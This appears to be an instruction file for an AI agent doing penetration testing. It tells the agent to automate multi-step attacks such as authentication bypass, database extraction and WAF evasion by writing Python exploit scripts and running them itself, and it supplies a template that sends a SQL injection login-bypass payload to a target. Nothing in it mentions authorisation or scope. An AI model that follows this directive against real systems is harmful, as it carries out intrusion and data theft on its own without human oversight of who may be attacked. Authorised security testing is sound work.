# ABSOLUTE DIRECTIVE: SCRIPTING OVER MANUAL EXECUTION

Whenever a vulnerability requires multiple steps (e.g., bypassing auth, querying a database, extracting data, or bypassing a WAF), you MUST NOT use manual, repetitive terminal commands. You MUST write an automation script.

## Rules for Exploit Scripts:
1. **Language:** Use Python 3.
2. **Dependencies:** Stick to standard libraries (`requests`, `sqlite3`, `sys`, `os`, `re`, `base64`) to ensure execution without `pip install`.
3. **Structure:**
   - Define targets and payloads as variables at the top.
   - Use `try/except` blocks for all network and file I/O operations.
   - Print clear, structured output to `stdout` so your future turns can read the results accurately.
4. **Execution:** Write the file using the `write_file` tool, then execute it using the `execute_terminal` tool (e.g., `python3 exploit.py`).

## Example Template:
```python
import requests
import sys

TARGET = "http://127.0.0.1:5000/login"
PAYLOAD = "admin' OR 1=1--"

def exploit():
    session = requests.Session()
    try:
        print("[*] Attempting authentication bypass...")
        res = session.post(TARGET, data={"user": PAYLOAD, "pass": "any"})
        if "SUCCESS" in res.text:
            print("[+] Bypass successful. Session cookies secured.")
            # Proceed to next step...
        else:
            print("[-] Bypass failed.")
    except Exception as e:
        print(f"[!] Critical Script Error: {e}")

if __name__ == "__main__":
    exploit()
```